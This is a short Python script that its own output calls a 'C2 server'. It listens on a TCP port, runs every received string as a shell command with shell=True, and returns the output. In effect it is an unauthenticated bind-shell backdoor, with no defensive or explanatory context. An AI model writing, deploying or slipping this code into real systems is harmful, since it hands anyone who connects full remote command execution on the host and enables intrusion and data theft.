import socket
import subprocess
import argparse

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True)
        return output.decode()
    except Exception as e:
        return str(e)

# Parse command-line arguments
parser = argparse.ArgumentParser(description='Python script with command-line arguments')
parser.add_argument('-i','--ip', type=str, default='127.0.0.1', help='IP address', required=False)
parser.add_argument('-p','--port', type=int, default=9991, help='Port number', required=False)

args = parser.parse_args()
host = args.ip
port = args.port

# socket connection
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_socket.bind((host, port))

server_socket.listen(5)
print(f"C2 server listening on {host}:{port}")
print("Waiting for incoming connections...")

while True:
    
    client_socket, addr = server_socket.accept()
    print(f"Connection established from: {addr[0]}:{addr[1]}")
    command = client_socket.recv(1024).decode().strip()
    output = execute_command(command)
    client_socket.send(output.encode())
    client_socket.close()

